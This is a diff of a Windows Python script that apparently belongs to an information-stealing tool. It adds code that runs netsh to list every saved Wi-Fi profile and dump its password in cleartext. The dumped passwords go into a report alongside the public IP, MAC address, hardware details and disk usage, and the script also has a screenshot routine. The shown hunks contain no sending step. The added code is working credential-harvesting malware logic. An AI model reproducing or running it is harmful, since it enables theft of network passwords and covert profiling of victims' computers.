@@ -473,12 +473,22 @@ Release: {systemspec.platform_info()[1]}
 Version: {systemspec.platform_info()[2]}
 Architecture: {systemspec.platform_info()[3]}
 
-IP Address: {systemspec.network_info()[0]}
-Mac Address: {systemspec.network_info()[1]}
+Wifi: 
+------------------------------
+{systemspec.network_info()[0]}
+------------------------------
+
+IP Address: {systemspec.network_info()[1]}
+Mac Address: {systemspec.network_info()[2]}
 
 CPU: {systemspec.system_specs()[0].Name}
 GPU: {systemspec.system_specs()[1].Name}
 RAM: {round(systemspec.system_specs()[2], 0)} GB
+
+Disk: 
+------------------------------
+{systemspec.system_specs()[3]}
+------------------------------
 """
         return sys_spec
 
@@ -509,17 +519,35 @@ RAM: {round(systemspec.system_specs()[2], 0)} GB
         return operating_sys, os_release, os_version, architecture
     
     def network_info():
+        wifi = ""
+        data = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode('utf-8', errors="backslashreplace").split('\n')
+        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+        for i in profiles:
+            try:
+                results = subprocess.Popen(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode('utf-8', errors="backslashreplace").split('\n')
+                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+                try: wifi += "{:<20} $ {}".format(i, results[0]) + "\n"
+                except IndexError: wifi += "{:<20} $ *No Password*".format(i) + "\n"
+            except subprocess.CalledProcessError: wifi += "{:<20} $ *No Password*".format(i) + "\n"
+                
         ip_address = requests.get('https://api.ipify.org').text
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 
-        return ip_address, mac_address
+        return wifi, ip_address, mac_address
     
     def system_specs():
         cpu = wmi.WMI().Win32_Processor()[0]
         gpu = wmi.WMI().Win32_VideoController()[0]
         ram = float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576
         
-        return cpu, gpu, ram
+        disk = ("{:<9} "*5).format("Drive", "Used GB", "Free GB", "Total GB", "Use%") + "\n"
+        for part in psutil.disk_partitions(all=False):
+            if os.name == 'nt':
+                if 'cdrom' in part.opts or part.fstype == '': continue
+            usage = psutil.disk_usage(part.mountpoint)
+            disk += ("{:<9} "*5).format(part.device, f"{usage.used/float(1<<30):,.0f}", f"{usage.free/float(1<<30):,.0f}", f"{usage.total/float(1<<30):,.0f}", usage.percent) + "\n"
+        
+        return cpu, gpu, ram, disk
 
 def image():
     os.remove('.\\screenshot.png') if os.path.exists('.\\screenshot.png') else None
